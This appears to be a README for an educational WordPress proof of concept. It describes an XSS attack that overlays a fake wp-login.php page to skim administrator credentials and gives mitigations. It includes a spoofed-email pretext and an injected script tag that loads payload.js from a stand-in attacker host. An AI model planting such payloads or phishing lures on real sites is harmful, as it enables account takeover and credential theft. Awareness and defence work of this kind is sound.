# WordPress XSS Fake wp-login.php Credential Skimming

This repo documents an attack on WordPress that allows to collect credentials of other WordPress users, e.g. admins. As it relies on a conceptual weakness of WordPress it will work on a fully patched system (probably) for years to come.

WARNING: This script is for educational purposes (e.g. awareness trainings) only! Do NOT use it to actually attack someone's website! To prevent script kiddies from using it, the actual code to send credentials to another server has been removed and it will instead be logging to the console.

## How the attack works

The attacker first needs a way to put JavaScript on a page. For example, editors have the "unfiltered_html" capability that allows them to put script-tags in posts. Having access to an editor's account is one way to carry out this attack.
Then, the attacker pastes a small piece of JavaScript code on the page that loads the contents of wp-login.php in the current page and changes the URL using the browser's history API. There is no visual difference between the original wp-login.php and the fake one. Even the URL is entirely the same. It should as well support custom-styled wp-login.php pages. (However, this depends on the actual configuration.) The only odd thing for a very attentive user might be a short flash of the original page.
As soon as someone submits the login form, the credentials are further processed by the attacker, the faked login page closes and reveals the original page, faking a successful login. During submission, it even waits a short time to simulate network delay.

To get an admin to enter her/his credentials a simple spoofed email might be sufficient, saying something like "Hi John, I discovered a bug on this page (URL to page) I'm unable to fix myself. Please help! (I set the page to be private so you might have to login.)". This is different from typical phishing mails as the URL is actually valid and clearly targets the actual site, not another phishing domain.

## Mitigation

This attack is successfull because an attacker is able to put malicious JavaScript code on a page and the skimmed credentials are sufficient to log in. Hence, securing the system against attackers by setting up two-factor authentication might be a good choice. Additionally, you could disallow the "unfiltered_html" capability from non-admin users, especially editors. Of course, fixing other XSS-related issues is as important. Additionally, you could setup Content Security Policy to disallow inline JavaScript.

## Setup

* Place payload.js on the attacker's server to be reachable from the target's machine.
* Modify the top settings in payload.js to fit the target and scenario.
* The payload is written to only log the credentials to the console. If you want to transmit them, you have to write this one-liner yourself. The position is marked in the code.
* Paste the on-page payload (see below) in the post's content to load the script.

## On-page payload

Put this piece of JavaScript on the page that allows to paste HTML into. The script requires jQuery. If the website's theme has already loaded it you can skip the first line.

```html
<script src="https://code.jquery.com/jquery-3.4.1.min.js"></script><!-- Only needed if the theme doesn't have jQuery loaded before. -->
<script src="https://www.attacker-website.com/payload.js"></script><!-- Replace with your target payload URL. -->
```